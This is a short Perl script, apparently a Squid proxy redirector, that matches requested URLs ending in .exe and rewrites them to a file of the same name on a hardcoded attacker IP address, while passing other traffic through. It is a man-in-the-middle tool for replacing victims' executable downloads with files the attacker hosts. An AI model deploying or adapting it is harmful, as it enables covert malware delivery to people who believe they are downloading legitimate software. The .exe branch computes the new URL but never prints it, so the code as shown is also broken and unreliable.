#!/usr/bin/perl
########################################################################
# replaceApplications.pl  --- Squid Script (Replace every application) #
# g0tmi1k 2011-03-25                                                   #
########################################################################
use IO::Handle;
use File::Basename;
use POSIX strftime;

$debug = 0;                               # Debug mode - create log file
$ourIP = "192.168.0.33";                  # Our IP address
$baseURL = "http://".$ourIP;              # Location on websever

$|=1;

if ($debug == 1) { open (DEBUG, '>>/tmp/replaceApplications_debug.log'); }
autoflush DEBUG 1;

print DEBUG "########################################################################\n";
print DEBUG strftime ("%d%b%Y-%H:%M:%S\t Server: $baseURL/\n",localtime(time()));
print DEBUG "########################################################################\n";
while (<>) {
   chomp $_;
   if ($_ =~ /(.*\.exe)/i) {
      $url = $1;
      if ($debug == 1) { print DEBUG "Input: $url\n"; }

      $filename = basename( $url );
      if ($debug == 1) { print DEBUG "Filename: $filename\n"; }

      $new_url = "http://$ourIP/$filename";
      if ($debug == 1) { print DEBUG "Output: $new_url\n"; }
   }
   else {
      print "$_\n";
      if ($debug == 1) { print DEBUG "Pass: $_\n"; }
   }
}

close (DEBUG);